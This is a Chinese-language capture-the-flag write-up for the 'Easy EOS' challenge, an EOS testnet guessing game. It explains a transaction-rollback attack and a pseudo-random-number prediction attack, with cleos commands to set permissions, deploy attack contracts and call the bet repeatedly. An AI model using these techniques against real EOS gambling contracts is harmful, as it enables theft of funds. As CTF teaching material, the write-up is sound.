>  恭喜Whitzard、$wagger、NoSugar、AAA解出Easy Eos。

## 题目

标题：Easy EOS

作者：Gaia

描述：

```shell
Try to win this game.
account: de1ctf111eos
EOS Jungle2.0 Testnet
You need to win at least 10 times.
You can ask for a flag with the sendmail function. (username: your account, address: your email address)

hint for [Easy EOS]: the num of bet action is in range 0-4. Decompilation is optional.
hint for [Easy EOS]: if you lost，you can't bet anymore with this account.
```



## 答案

### 方法一：交易回滚攻击

经观察，发现`bet action` 在一次交易中完成了猜数字游戏，并且发现若赢了，则users表中win的次数+1；若输了，则users表中lost的次数+1。

可以通过部署合约，通过`inline action`的方式，分别进行猜数字和判断。第一个`action`猜数字，第二个`action`进行判断刚刚是否赢了。若赢了，则通过；若输了，则抛出异常，使整个交易回滚。（耍赖）

攻击方式

```shell
# 设置权限
cleos set account permission gllrgjlqclkp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"gllrgjlqclkp","permission":"eosio.code"},"weight":1}]}' owner -p gllrgjlqclkp@owner
# 编译合约
cd attack4
eosio-cpp -o attack4.wasm attack4.cpp
# 部署合约
cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active
# 调用makebet方法多次，直到账号win次数大于等于10
cleos push action gllrgjlqclkp makebet '[]' -p gllrgjlqclkp@active
# 请求发送flag
cleos push action de1ctftest11 sendmail '["gllrgjlqclkp", "xxxx@qq.com"]' -p gllrgjlqclkp@active
```

### 方法二：伪随机数攻击

经过反编译得到伪随机数产生的算法，部署相应的合约，在一次交易中，计算将要产生的随机数，然后用该随机数调用目标合约的`bet action`。

攻击方式

```shell
# 设置权限
cleos set account permission btdaciaibmfp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"btdaciaibmfp","permission":"eosio.code"},"weight":1}]}' owner -p btdaciaibmfp@owner
# 编译合约
cd attack
eosio-cpp -o attack.wasm attack.cpp
# 部署合约
cleos set contract btdaciaibmfp . -p btdaciaibmfp@active
# 调用makebet方法10次
cleos push action btdaciaibmfp makebet '[]' -p btdaciaibmfp@active
# 请求发送flag
cleos push action de1ctftest11 sendmail '["btdaciaibmfp", "xxxxxx@gmail.com"]' -p btdaciaibmfp@active
```





